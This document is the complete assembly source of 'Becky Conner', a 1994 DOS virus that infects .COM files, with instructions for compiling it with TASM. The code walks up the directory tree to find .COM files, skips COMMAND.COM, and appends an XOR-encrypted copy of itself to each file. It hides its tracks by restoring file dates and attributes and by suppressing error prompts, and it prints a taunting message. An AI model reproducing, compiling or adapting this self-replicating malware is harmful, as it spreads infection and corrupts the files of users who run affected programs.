;  Becky Conner written by MuTaTiON INTERRUPT
;  To compile this use TASM /M becky.asm
;---------


code    segment public 'code'
        assume  cs:code
        org     100h                              ; All .COM files start here

start:
        db 0e9h,0,0                               ; Jump to the next command

virus:
        call    realcode                          ; Push current location on stack
realcode:
        nop
        pop     bp                                ; Get location off stack
        nop
        nop
        sub     bp,offset realcode                ; Adjust it for our pointer
        nop
        nop
        call    encrypt_decrypt                   ; Decrypt the virus first

encrypt_start   equ     $                         ; From here is encrypted

        lea     si,[bp+offset oldjump]            ; Location of old jump in si
        mov     di,100h                           ; Location of where to put it in di
        push    di                                ; Save so we could just return when done
        movsb                                     ; Move a byte
        movsw                                     ; Move a word

        lea     dx,[bp+offset dta]                ; Where to put New DTA
        call    set_DTA                           ; Move it

        mov     ax,3524h                          ; Get int 24 handler
        int     21h                               ; To ES:BX
        mov     word ptr [bp+oldint24],bx         ; Save it
        mov     word ptr [bp+oldint24+2],es

        mov     ah,25h                            ; Set new int 24 handler
        lea     dx,[bp+offset int24]              ; DS:DX->new handler
        int     21h

        push    cs                                ; Restore ES
        pop     es                                ; 'cuz it was changed

        mov     ah,47h                            ; Get the current directory
        mov     dl,0h                             ; On current drive
        lea     si,[bp+offset currentdir]         ; Where to keep it
        int     21h

dirloop:
        lea     dx,[bp+offset comfilespec]
        call    findfirst

        lea     dx,[bp+offset directory]          ; Where to change too '..'
        mov     ah,3bh                            ; Change directory
        int     21h
        jnc     dirloop                           ; If no problems the look for files

        mov     ah,9                              ; Display string
        lea     dx,[bp+virusname]
        int     21h

        mov     ax,2524h                          ; Restore int 24 handler
        lds     dx,[bp+offset oldint24]           ; To original
        int     21h

        push    cs
        pop     ds                                ; Do this because the DS gets changed

        lea     dx,[bp+offset currentdir]         ; Location Of original dir
        mov     ah,3bh                            ; Change to there
        int     21h

        mov     dx,80h                            ; Location of original DTA
        call    set_dta                           ; Put it back there

        retn                                      ; Return to 100h to original jump

findfirst:
        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

findnext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

Findnext2:
        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

quit:
        ret

infection:
        mov     ax,3d00h                          ; Open file for read only
        call    open

        mov     ah,3fh                            ; Read from file
        mov     cx,1ah
        lea     dx,[bp+offset buffer]             ; Location to store them
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        mov     ax,word ptr [bp+DTA+35]           ; Get end of file name in ax
        cmp     ax,'DN'                           ; Does End in comma'ND'? (reverse order)
        jz      quitinfect                        ; Yup so get another file

CheckCom:
        mov     bx,[bp+offset dta+1ah]            ; Get file size
        mov     cx,word ptr [bp+buffer+1]         ; Get jump loc of file
        add     cx,eof-virus+3                    ; Add for virus size

        cmp     bx,cx                             ; Does file size=file jump+virus size
        jz      quitinfect                        ; Yup then get another file
        jmp     infectcom

quitinfect:
        ret

InfectCom:
        sub     bx,3                              ; Adjust for new jump
        lea     si,[bp+buffer]
        lea     di,[bp+oldjump]
        movsw
        movsb
        mov     [bp+buffer],byte ptr 0e9h
        mov     word ptr [bp+buffer+1],bx         ; Save for later

        mov     cx,3                              ; Number of bytes to write

        jmp     finishinfection
FinishInfection:
        push    cx                                ; save # of bytes to write
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

        mov     ah,40h                            ; Write to file
        lea     dx,[bp+buffer]                    ; Location of bytes
        pop     cx                                ; Get number of bytes to write
        int     21h
        jc      closefile

        mov     al,02                             ; Move Fpointer to eof
        Call    move_fp

get_time:
        mov     ah,2ch                            ; Get time for our encryption value
        int     21h
        cmp     dh,0                              ; If its seconds are zere get another
        je      get_time
        mov     [bp+enc_value],dh                 ; Use seconds value for encryption
        call    encrypt_infect                    ; Encrypt and infect the file
closefile:
        mov     ax,5701h                          ; Set files date/time back
        mov     cx,word ptr [bp+dta+16h]          ; Get old time from dta
        mov     dx,word ptr [bp+dta+18h]          ; Get old date
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     cl,byte ptr [bp+dta+15h]          ; Get old Attributes
        call    attributes

        retn

move_fp:
        mov     ah,42h                            ; Move file pointer
        xor     cx,cx                             ; Al has location
        xor     dx,dx                             ; Clear these
        int     21h
        retn

set_dta:
        mov     ah,1ah                            ; Move the DTA location
        int     21h
        retn

open:
        mov     ah,3dh                            ; open file
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        xchg    ax,bx                             ; file handle in bx
        ret

attributes:
        mov     ax,4301h                          ; Set attributes to cx
        lea     dx,[bp+DTA+30]                    ; filename in DTA
        int     21h
        ret
int24:                                            ; New int 24h (error) handler
        mov     al,3                              ; Fail call
        iret                                      ; Return from int 24 call

Virusname db 'Becky Conner - I Hate Mark!',10,13
Author    db 'MuTaTiON INTERRUPT',10,13           ; Author Of This Virus
Made_with db '[NOVEMBER 1994]',10,13,'$'          ; Please do not remove this

comfilespec  db  '*.com',0                        ; Holds type of file to look for
directory    db '..',0                            ; Directory to change to
oldjump      db  0cdh,020h,0h                     ; Old jump.  Is int 20h for file quit

encrypt_infect:
        lea     si,[bp+offset move_begin]         ; Location of where to move from
        lea     di,[bp+offset workarea]           ; Where to move it too
        mov     cx,move_end-move_begin            ; Number of bytes to move
move_loop:
        movsb                                     ; Moves this routine into heap
        loop    move_loop
        lea     dx,[bp+offset workarea]
        call    dx                                ; Jump to that routine just moved
        ret

move_begin    equ     $                           ; Marks beginning of move
        push    bx                                ; Save the file handle
        lea     dx,[bp+offset encrypt_end]
        call    dx                                ; Call the encrypt_decrypt procedure
        pop     bx                                ; Get handle back in bx and return
        mov     ah,40h                            ; Write to file
        mov     cx,eof-virus                      ; Number of bytes
        lea     dx,[bp+offset virus]              ; Where to write from
        int     21h
        push    bx                                ; Save the file handle
        lea     dx,[bp+offset encrypt_end]
        call    dx                                ; Decrypt the file and return
        pop     bx                                ; Get handle back in bx and return
        ret
move_end      equ     $                           ; Marks the end of move

encrypt_end   equ     $                           ; Marks the end of encryption

encrypt_decrypt:
        lea     bx,[bp+encrypt_start]             ; Where to start encryption
        mov     cx,encrypt_end-encrypt_start      ; Number of bytes to encrypt
        mov     dh,[bp+enc_value]                 ; Value to use for encryption
encrypt_loop:
        mov     ah,cs:[bx]                        ; Get a byte in ah
        xor     ah,dh                             ; Xor it
        mov     cs:[bx],ah                        ; Put it back
        inc     bx                                ; Move to next byte and loop
        loop    encrypt_loop
        ret

enc_value     db    00h                           ; Hold the encryption value 00 for nul effect

eof     equ     $                                 ; Marks the end of file

workarea db     move_end-move_begin dup (?)       ; Holds the encrypt_infect routine
currentdir db   64 dup (?)                        ; Holds the current dir
dta     db      42 dup (?)                        ; Location of new DTA
buffer db 1ah dup (?)                             ; Holds exe header
oldint24 dd ?                                     ; Storage for old int 24h handler

code    ends
        end     start

